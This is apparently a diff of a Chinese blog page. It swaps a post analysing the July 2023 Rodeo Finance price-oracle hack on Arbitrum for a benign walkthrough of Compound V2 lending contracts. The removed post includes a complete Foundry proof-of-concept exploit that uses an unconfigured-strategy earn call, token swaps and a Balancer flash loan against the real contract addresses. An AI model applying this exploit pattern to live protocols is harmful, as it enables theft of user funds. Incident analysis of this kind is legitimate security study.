@@ -4,9 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="20230711 RodeoFinance, Blog">
-    <meta name="description" content="攻击介绍2023年7月11日，Arbitrum链上的Rodeo Finance: Pool由于价格预言机操纵，而被黑客盗取了472 ETH。
-攻击分析攻击者利用了预言机的缺陷控制了unshETH与ETH之间的兑换比率,预言机使用 ETH 与">
+    <meta name="keywords" content="compund分析, Blog">
+    <meta name="description" content="Compound V2 解析前言Compound V3版本早已在2022年8月26日上线了以太坊主网，之所以写Compound V2的解析是因为V2版本简单一点，更好入门。
+准备Compound V2官网
+Compound V2开发文档
+C">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +20,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>20230711 RodeoFinance | Blog</title>
+    <title>compund分析 | Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -283,12 +285,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">20230711 RodeoFinance</h1>
+                    <h1 class="description center-align post-title">compund分析</h1>
                 </div>
             </div>
         </div>
@@ -324,28 +326,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-11-03
+                    2024-03-08
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-01-17
+                    2024-03-18
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    680
+                    1.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    8 分
                 </div>
                 
 
@@ -365,160 +367,273 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h1><p>2023年7月11日，Arbitrum链上的Rodeo Finance: Pool由于价格预言机操纵，而被黑客盗取了472 ETH。</p>
-<h1 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h1><p>攻击者利用了预言机的缺陷控制了unshETH与ETH之间的兑换比率,预言机使用 ETH 与 unshETH 的准备金比率来检查价格。同时攻击者能够通过具有未配置策略地址的 earn 函数强制平台将 USDC 兑换为 unshETH。由于价格预言机存在缺陷，滑点控制无法生效。(具体可见Meth为0x7b37c42b的交易)。</p>
-<pre><code>function earn(address usr, address pol, uint256 str, uint256 amt, uint256 bor, bytes calldata dat)
-  external
-  loop
-  returns (uint256)
-{
-  if (status &lt; S_LIVE) revert WrongStatus();
-  if (!pools[pol]) revert InvalidPool();
-  if (strategies[str] == address(0)) revert InvalidStrategy();
-  uint256 id = nextPosition++;
-  Position storage p = positions[id];
-  p.owner = usr;
-  p.pool = pol;
-  p.strategy = str;
-  p.outset = block.timestamp;
-  pullTo(IERC20(IPool(p.pool).asset()), msg.sender, address(actor), uint256(amt));
-  (int256 bas, int256 sha, int256 bar) = actor.edit(id, int256(amt), int256(bor), dat);
-  p.amount = uint256(bas);
-  p.shares = uint256(sha);
-  p.borrow = uint256(bar);
-  emit Edit(id, int256(amt), int256(bor), sha, bar);
-  return id;
-}
+                <h1 id="Compound-V2-解析"><a href="#Compound-V2-解析" class="headerlink" title="Compound V2 解析"></a>Compound V2 解析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Compound V3版本早已在2022年8月26日上线了以太坊主网，之所以写Compound V2的解析是因为V2版本简单一点，更好入门。</p>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p><a target="_blank" rel="noopener" href="https://cloudflare-ipfs.com/ipfs/QmbjzyFDCAXVTkVaNMbPFbeuJmjTcSVDxq3VzQEMRkzz9V/">Compound V2官网</a></p>
+<p><a target="_blank" rel="noopener" href="https://docs.compound.finance/v2/#guides">Compound V2开发文档</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/compound-finance/compound-protocol">Compound V2源码仓库</a></p>
+<h2 id="官网"><a href="#官网" class="headerlink" title="官网"></a>官网</h2><p>因为Compound没有像Aave那样提供测试网，因此无法做演示。所以就不过多介绍官网了。</p>
+<h2 id="合约架构"><a href="#合约架构" class="headerlink" title="合约架构"></a>合约架构</h2><p>cToken：cToken合约是主要业务逻辑的合约，用户直接操作的合约，保存用户资产，提供业务接口。<br>interestRateModel：提供资产利率的计算模型的抽象合约。<br>comptroller：封装了一些操作条件审查。<br>priceOracle：价格预言机，提供资产价格。</p>
+<h2 id="CToken-sol"><a href="#CToken-sol" class="headerlink" title="CToken.sol"></a>CToken.sol</h2><h3 id="存款"><a href="#存款" class="headerlink" title="存款"></a>存款</h3><p>入口函数</p>
+<pre class=" language-solidity"><code class="language-solidity">    function mintInternal(uint mintAmount) internal nonReentrant {
+        accrueInterest();
+        // mintFresh emits the actual Mint event if successful and logs on errors, so we don't need to
+        mintFresh(msg.sender, mintAmount);
+    }
 </code></pre>
-<p>其次unshETH价格使用了TWAP，是计算45分钟内的最后4次更新价格实例的平均值，导致攻击者可以通过”三明治”来控制价格，从而套利。</p>
-<pre><code>function latestAnswer() external view returns (int256) {
-  require(block.timestamp &lt; lastTimestamp + (updateInterval * 2), "stale price");
-  int256 price = (prices[0] + prices[1] + prices[2] + prices[3]) / 4;
-  return price;
-}
+<p>可以看到mintInternal方法首先会调用accrueInterest计算新的利息(在InterestRateModel合约时再看)，然后调用mintFresh方法。</p>
+<pre class=" language-solidity"><code class="language-solidity">function mintFresh(address minter, uint mintAmount) internal {
+        /* Fail if mint not allowed */
+        uint allowed = comptroller.mintAllowed(address(this), minter, mintAmount);
+        if (allowed != 0) {
+            revert MintComptrollerRejection(allowed);
+        }
+
+        /* Verify market's block number equals current block number */
+        if (accrualBlockNumber != getBlockNumber()) {
+            revert MintFreshnessCheck();
+        }
+
+        Exp memory exchangeRate = Exp({mantissa: exchangeRateStoredInternal()});
+
+        /////////////////////////
+        // EFFECTS & INTERACTIONS
+        // (No safe failures beyond this point)
+
+        /*
+         *  We call `doTransferIn` for the minter and the mintAmount.
+         *  Note: The cToken must handle variations between ERC-20 and ETH underlying.
+         *  `doTransferIn` reverts if anything goes wrong, since we can't be sure if
+         *  side-effects occurred. The function returns the amount actually transferred,
+         *  in case of a fee. On success, the cToken holds an additional `actualMintAmount`
+         *  of cash.
+         */
+        uint actualMintAmount = doTransferIn(minter, mintAmount);
+
+        /*
+         * We get the current exchange rate and calculate the number of cTokens to be minted:
+         *  mintTokens = actualMintAmount / exchangeRate
+         */
+
+        uint mintTokens = div_(actualMintAmount, exchangeRate);
+
+        /*
+         * We calculate the new total supply of cTokens and minter token balance, checking for overflow:
+         *  totalSupplyNew = totalSupply + mintTokens
+         *  accountTokensNew = accountTokens[minter] + mintTokens
+         * And write them into storage
+         */
+        totalSupply = totalSupply + mintTokens;
+        accountTokens[minter] = accountTokens[minter] + mintTokens;
+
+        /* We emit a Mint event, and a Transfer event */
+        emit Mint(minter, actualMintAmount, mintTokens);
+        emit Transfer(address(this), minter, mintTokens);
+
+        /* We call the defense hook */
+        // unused function
+        // comptroller.mintVerify(address(this), minter, actualMintAmount, mintTokens);
+    }
 </code></pre>
-<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>// SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.10;
-
-import "forge-std/Test.sol";
-import "./interface.sol";
-
-// Vulnerable Contract : 0xf3721d8a2c051643e06bf2646762522fa66100da
-// Attack Tx : 0xb1be5dee3852c818af742f5dd44def285b497ffc5c2eda0d893af542a09fb25a
-
-
-interface IInvestor {
-    function earn(
-        address usr,
-        address pol,
-        uint256 str,
-        uint256 amt,
-        uint256 bor,
-        bytes memory dat
-    ) external returns (uint256);
-}
-
-interface ICamelotRouter {
-    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
-        uint256 amountIn,
-        uint256 amountOutMin,
-        address[] memory path,
-        address to,
-        address referrer,
-        uint256 deadline
-    ) external;
-}
-
-interface ISwapRouter {
-    struct ExactInputParams {
-        bytes path;
-        address recipient;
-        uint256 deadline;
-        uint256 amountIn;
-        uint256 amountOutMinimum;
+<p>可以看到mintFresh方法中首先进行了一系列的检查，然后计算汇率，再根据汇率计算获得的cToken数量，最后更新用户状态和totalSupply。</p>
+<h3 id="取款"><a href="#取款" class="headerlink" title="取款"></a>取款</h3><p>入口函数</p>
+<pre class=" language-solidity"><code class="language-solidity">    function redeemInternal(uint redeemTokens) internal nonReentrant {
+        accrueInterest();
+        // redeemFresh emits redeem-specific logs on errors, so we don't need to
+        redeemFresh(payable(msg.sender), redeemTokens, 0);
     }
-
-    function exactInput(ExactInputParams memory params) external payable returns (uint256 amountOut);
-}
-
-contract RodeoTest is Test {
-    IERC20 unshETH = IERC20(0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef);
-    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
-    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
-    IInvestor Investor = IInvestor(0x8accf43Dd31DfCd4919cc7d65912A475BfA60369);
-    ICamelotRouter Router = ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);
-    ISwapRouter SwapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
-    IBalancerVault Vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-    address private constant usdcPool = 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE;
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
-    function setUp() public {
-        cheats.createSelectFork("arbitrum", 110_043_452);
-        cheats.label(address(unshETH), "unsETH");
-        cheats.label(address(WETH), "WETH");
-        cheats.label(address(USDC), "USDC");
-        cheats.label(address(Investor), "Investor");
-        cheats.label(address(Router), "Router");
-        cheats.label(address(SwapRouter), "SwapRouter");
-        cheats.label(address(Vault), "Vault");
-    }
-
-    function testExploit() public {
-
-        deal(address(unshETH), address(this), 47_294_222_088_336_002_957);
-        unshETH.approve(address(Router), type(uint256).max);
-        WETH.approve(address(Router), type(uint256).max);
-        USDC.approve(address(SwapRouter), type(uint256).max);
-
-        Investor.earn(address(this), usdcPool, 41, 0, 400_000 * 1e6, abi.encode(500));
-       
-        swapTokens(unshETH.balanceOf(address(this)), address(unshETH), address(WETH));
-        swapTokens(WETH.balanceOf(address(this)), address(WETH), address(USDC));
-
-        swapUSDCToWETH();
-        takeWETHFlashloanOnBalancer();
-
-    }
-
-    function receiveFlashLoan(
-        address[] memory tokens,
-        uint256[] memory amounts,
-        uint256[] memory feeAmounts,
-        bytes memory userData
-    ) external {
-        
-        swapTokens(amounts[0], address(WETH), address(USDC));
-        
-        swapUSDCToWETH();
-        
-        WETH.transfer(address(Vault), amounts[0]);
-    }
-
-    function swapTokens(uint256 amountIn, address fromToken, address toToken) internal {
-        address[] memory path = new address[](2);
-        path[0] = fromToken;
-        path[1] = toToken;
-        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amountIn, 0, path, address(this), address(0), block.timestamp + 100
-        );
-    }
-
-    function swapUSDCToWETH() internal {
-        bytes memory path = abi.encodePacked(address(USDC), uint24(500), address(WETH));
-        ISwapRouter.ExactInputParams memory params =
-            ISwapRouter.ExactInputParams(path, address(this), block.timestamp + 100, USDC.balanceOf(address(this)), 0);
-        SwapRouter.exactInput(params);
-    }
-
-    function takeWETHFlashloanOnBalancer() internal {
-        address[] memory tokens = new address[](1);
-        tokens[0] = address(WETH);
-        uint256[] memory amounts = new uint256[](1);
-        amounts[0] = 30e18;
-        Vault.flashLoan(address(this), tokens, amounts, bytes(""));
-    }
-}
 </code></pre>
+<p>同样redeemInternal方法首先会调用accrueInterest计算新的利息，然后调用redeemFresh方法。</p>
+<pre class=" language-solidity"><code class="language-solidity">    function redeemFresh(address payable redeemer, uint redeemTokensIn, uint redeemAmountIn) internal {
+        require(redeemTokensIn == 0 || redeemAmountIn == 0, "one of redeemTokensIn or redeemAmountIn must be zero");
+
+        /* exchangeRate = invoke Exchange Rate Stored() */
+        Exp memory exchangeRate = Exp({mantissa: exchangeRateStoredInternal() });
+
+        uint redeemTokens;
+        uint redeemAmount;
+        /* If redeemTokensIn > 0: */
+        if (redeemTokensIn > 0) {
+            /*
+             * We calculate the exchange rate and the amount of underlying to be redeemed:
+             *  redeemTokens = redeemTokensIn
+             *  redeemAmount = redeemTokensIn x exchangeRateCurrent
+             */
+            redeemTokens = redeemTokensIn;
+            redeemAmount = mul_ScalarTruncate(exchangeRate, redeemTokensIn);
+        } else {
+            /*
+             * We get the current exchange rate and calculate the amount to be redeemed:
+             *  redeemTokens = redeemAmountIn / exchangeRate
+             *  redeemAmount = redeemAmountIn
+             */
+            redeemTokens = div_(redeemAmountIn, exchangeRate);
+            redeemAmount = redeemAmountIn;
+        }
+
+        /* Fail if redeem not allowed */
+        uint allowed = comptroller.redeemAllowed(address(this), redeemer, redeemTokens);
+        if (allowed != 0) {
+            revert RedeemComptrollerRejection(allowed);
+        }
+
+        /* Verify market's block number equals current block number */
+        if (accrualBlockNumber != getBlockNumber()) {
+            revert RedeemFreshnessCheck();
+        }
+
+        /* Fail gracefully if protocol has insufficient cash */
+        if (getCashPrior() < redeemAmount) {
+            revert RedeemTransferOutNotPossible();
+        }
+
+        /////////////////////////
+        // EFFECTS & INTERACTIONS
+        // (No safe failures beyond this point)
+
+
+        /*
+         * We write the previously calculated values into storage.
+         *  Note: Avoid token reentrancy attacks by writing reduced supply before external transfer.
+         */
+        totalSupply = totalSupply - redeemTokens;
+        accountTokens[redeemer] = accountTokens[redeemer] - redeemTokens;
+
+        /*
+         * We invoke doTransferOut for the redeemer and the redeemAmount.
+         *  Note: The cToken must handle variations between ERC-20 and ETH underlying.
+         *  On success, the cToken has redeemAmount less of cash.
+         *  doTransferOut reverts if anything goes wrong, since we can't be sure if side effects occurred.
+         */
+        doTransferOut(redeemer, redeemAmount);
+
+        /* We emit a Transfer event, and a Redeem event */
+        emit Transfer(redeemer, address(this), redeemTokens);
+        emit Redeem(redeemer, redeemAmount, redeemTokens);
+
+        /* We call the defense hook */
+        comptroller.redeemVerify(address(this), redeemer, redeemAmount, redeemTokens);
+    }
+</code></pre>
+<p>redeemFresh逻辑与mintFresh差不多，就是根据exchangeRateStoredInternal的汇率将抵押品赎回，归还一定量的cToken，唯一不同的是 用户可以根据redeemTokensIn或redeemAmountIn来选择取出多少质押品或出多少cToken。最后通过doTransferOut(redeemer, redeemAmount);转给用户。</p>
+<h3 id="借款"><a href="#借款" class="headerlink" title="借款"></a>借款</h3><p>入口函数</p>
+<pre class=" language-solidity"><code class="language-solidity">function borrowInternal(uint borrowAmount) internal nonReentrant {
+        accrueInterest();
+        // borrowFresh emits borrow-specific logs on errors, so we don't need to
+        borrowFresh(payable(msg.sender), borrowAmount);
+    }
+</code></pre>
+<p>与上同理</p>
+<pre class=" language-solidity"><code class="language-solidity">function borrowFresh(address payable borrower, uint borrowAmount) internal {
+        /* Fail if borrow not allowed */
+        uint allowed = comptroller.borrowAllowed(address(this), borrower, borrowAmount);
+        if (allowed != 0) {
+            revert BorrowComptrollerRejection(allowed);
+        }
+
+        /* Verify market's block number equals current block number */
+        if (accrualBlockNumber != getBlockNumber()) {
+            revert BorrowFreshnessCheck();
+        }
+
+        /* Fail gracefully if protocol has insufficient underlying cash */
+        if (getCashPrior() < borrowAmount) {
+            revert BorrowCashNotAvailable();
+        }
+
+        /*
+         * We calculate the new borrower and total borrow balances, failing on overflow:
+         *  accountBorrowNew = accountBorrow + borrowAmount
+         *  totalBorrowsNew = totalBorrows + borrowAmount
+         */
+        uint accountBorrowsPrev = borrowBalanceStoredInternal(borrower);
+        uint accountBorrowsNew = accountBorrowsPrev + borrowAmount;
+        uint totalBorrowsNew = totalBorrows + borrowAmount;
+
+        /////////////////////////
+        // EFFECTS & INTERACTIONS
+        // (No safe failures beyond this point)
+
+        /*
+         * We write the previously calculated values into storage.
+         *  Note: Avoid token reentrancy attacks by writing increased borrow before external transfer.
+        `*/
+        accountBorrows[borrower].principal = accountBorrowsNew;
+        accountBorrows[borrower].interestIndex = borrowIndex;
+        totalBorrows = totalBorrowsNew;
+
+        /*
+         * We invoke doTransferOut for the borrower and the borrowAmount.
+         *  Note: The cToken must handle variations between ERC-20 and ETH underlying.
+         *  On success, the cToken borrowAmount less of cash.
+         *  doTransferOut reverts if anything goes wrong, since we can't be sure if side effects occurred.
+         */
+        doTransferOut(borrower, borrowAmount);
+
+        /* We emit a Borrow event */
+        emit Borrow(borrower, borrowAmount, accountBorrowsNew, totalBorrowsNew);
+    }
+</code></pre>
+<p>在borrowFresh中首先通过borrowBalanceStoredInternal计算用户的上次借款总数accountBorrowsPrev(包含利息)，然后加上本次借款数borrowAmount得到本次借款总数，存到 accountBorrows[borrower]。其中principal是用户借款总数，interestIndex为利率指数。</p>
+<h3 id="还款"><a href="#还款" class="headerlink" title="还款"></a>还款</h3><p>入口函数</p>
+<pre class=" language-solidity"><code class="language-solidity">    function repayBorrowInternal(uint repayAmount) internal nonReentrant {
+        accrueInterest();
+        // repayBorrowFresh emits repay-borrow-specific logs on errors, so we don't need to
+        repayBorrowFresh(msg.sender, msg.sender, repayAmount);
+    }
+</code></pre>
+<p>与上同理</p>
+<pre class=" language-solidity"><code class="language-solidity">  function repayBorrowFresh(address payer, address borrower, uint repayAmount) internal returns (uint) {
+        /* Fail if repayBorrow not allowed */
+        uint allowed = comptroller.repayBorrowAllowed(address(this), payer, borrower, repayAmount);
+        if (allowed != 0) {
+            revert RepayBorrowComptrollerRejection(allowed);
+        }
+
+        /* Verify market's block number equals current block number */
+        if (accrualBlockNumber != getBlockNumber()) {
+            revert RepayBorrowFreshnessCheck();
+        }
+
+        /* We fetch the amount the borrower owes, with accumulated interest */
+        uint accountBorrowsPrev = borrowBalanceStoredInternal(borrower);
+
+        /* If repayAmount == -1, repayAmount = accountBorrows */
+        uint repayAmountFinal = repayAmount == type(uint).max ? accountBorrowsPrev : repayAmount;
+
+        /////////////////////////
+        // EFFECTS & INTERACTIONS
+        // (No safe failures beyond this point)
+
+        /*
+         * We call doTransferIn for the payer and the repayAmount
+         *  Note: The cToken must handle variations between ERC-20 and ETH underlying.
+         *  On success, the cToken holds an additional repayAmount of cash.
+         *  doTransferIn reverts if anything goes wrong, since we can't be sure if side effects occurred.
+         *   it returns the amount actually transferred, in case of a fee.
+         */
+        uint actualRepayAmount = doTransferIn(payer, repayAmountFinal);
+
+        /*
+         * We calculate the new borrower and total borrow balances, failing on underflow:
+         *  accountBorrowsNew = accountBorrows - actualRepayAmount
+         *  totalBorrowsNew = totalBorrows - actualRepayAmount
+         */
+        uint accountBorrowsNew = accountBorrowsPrev - actualRepayAmount;
+        uint totalBorrowsNew = totalBorrows - actualRepayAmount;
+
+        /* We write the previously calculated values into storage */
+        accountBorrows[borrower].principal = accountBorrowsNew;
+        accountBorrows[borrower].interestIndex = borrowIndex;
+        totalBorrows = totalBorrowsNew;
+
+        /* We emit a RepayBorrow event */
+        emit RepayBorrow(payer, borrower, actualRepayAmount, accountBorrowsNew, totalBorrowsNew);
+
+        return actualRepayAmount;
+    }
+</code></pre>
+<p>同样通过borrowBalanceStoredInternal计算用户的借款总数accountBorrowsPrev(包括利息),再通过doTransferIn(payer, repayAmountFinal);还款并且得到实际还款，最后更新状态。</p>
+<h2 id="InterestRateModel-sol"><a href="#InterestRateModel-sol" class="headerlink" title="InterestRateModel.sol"></a>InterestRateModel.sol</h2><p>Compound有直线型和拐点型两种利率模型。<br>直线型：<br>在该模型下，资产的利率会随着资金使用率升高而线性增长（利率 = 基准年利率 + 资金使用率 * 增长率）<br>拐点型：<br>在该模型下，资产利率的增长会分为两段，前面一段增长率较低，后面一段增长率较高。目前Compound 使用这一种利率模型，以资金使用率 80% 为拐点。</p>
 
                 
             </div>
@@ -545,7 +660,7 @@ contract RodeoTest is Test {
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://willcking.github.io/2023/11/03/20230711-RodeoFinance/">https://willcking.github.io/2023/11/03/20230711-RodeoFinance/</a>
+                    <a href="https://willcking.github.io/2024/03/08/compund%E5%88%86%E6%9E%90/">https://willcking.github.io/2024/03/08/compund%E5%88%86%E6%9E%90/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -663,13 +778,13 @@ contract RodeoTest is Test {
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2024/01/17/ERC721A%E8%A7%A3%E6%9E%90/">
+                <a href="/2024/03/08/Aave%E5%88%86%E6%9E%90/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="ERC721A解析">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="Aave分析">
                         
-                        <span class="card-title">ERC721A解析</span>
+                        <span class="card-title">Aave分析</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -680,7 +795,7 @@ contract RodeoTest is Test {
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2024-01-17
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-03-08
                         </span>
                         <span class="publish-author">
                             
@@ -700,13 +815,13 @@ contract RodeoTest is Test {
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/10/26/20230717-NewFi/">
+                <a href="/2024/01/17/ERC721A%E8%A7%A3%E6%9E%90/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="20230717 NewFi">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="ERC721A解析">
                         
-                        <span class="card-title">20230717 NewFi</span>
+                        <span class="card-title">ERC721A解析</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -717,7 +832,7 @@ contract RodeoTest is Test {
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-01-17
                             </span>
                         <span class="publish-author">
                             
